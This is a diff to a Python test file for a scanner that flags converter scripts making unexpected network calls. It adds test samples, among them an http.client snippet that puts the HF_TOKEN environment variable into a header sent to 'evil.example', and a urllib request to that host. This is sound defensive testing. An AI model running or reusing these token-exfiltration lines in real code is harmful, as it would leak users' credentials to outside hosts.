@@ -4509,10 +4509,23 @@ def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
         'ftplib.FTP("evil.example").storbinary("STOR x",'
         ' os.environ["HF_TOKEN"].encode())\n',
         'from websockets import connect as c\nc("wss://evil.example")\n',
+        # The member counts with its parent: from http import client is
+        # http.client, and reading the module alone saw only "http". None of
+        # putrequest, putheader or endheaders is a write this rule knows.
+        'from http import client\n'
+        'c = client.HTTPSConnection("evil.example")\n'
+        'c.putrequest("GET", "/")\n'
+        'c.putheader("a", os.environ["HF_TOKEN"])\nc.endheaders()\n',
+        'from urllib import request\nrequest.urlopen("http://evil.example")\n',
     ):
         assert [
             f.check for f in scan_converter_source(preamble + body + download)
         ], body
+
+    # An ordinary member of an ordinary module is not one of these.
+    assert scan_converter_source(
+        preamble + 'from os import path\n' + download
+    ) == []
 
     # The download on its own is what the allowance is for.
     assert scan_converter_source(preamble + download) == []
